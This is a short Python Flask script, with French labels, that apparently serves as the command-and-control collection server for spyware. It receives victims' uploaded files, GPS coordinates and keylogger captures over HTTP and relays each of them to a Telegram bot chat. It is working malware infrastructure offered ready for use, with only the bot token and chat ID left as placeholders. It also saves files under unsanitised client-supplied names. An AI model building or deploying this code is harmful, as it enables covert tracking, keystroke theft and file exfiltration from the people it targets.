from flask import Flask, request
import telebot
import os

TOKEN = "TON_BOT_TOKEN"
CHAT_ID = "TON_CHAT_ID"
UPLOAD_FOLDER = "uploads"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' in request.files:
        file = request.files['file']
        path = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(path)
        bot.send_message(CHAT_ID, f"[+] Fichier reçu : {file.filename}")
        bot.send_document(CHAT_ID, open(path, 'rb'))
    elif request.json:
        data = request.json
        message = f"📡 GPS : {data.get('latitude')}, {data.get('longitude')}\n🖥️ Keylog : {data.get('keylog')}"
        bot.send_message(CHAT_ID, message)
    return "OK"

@app.route('/')
def home():
    return "Serveur d'écoute actif."

bot.send_message(CHAT_ID, "[+] Serveur VPS prêt.")
app.run(host="0.0.0.0", port=5000)
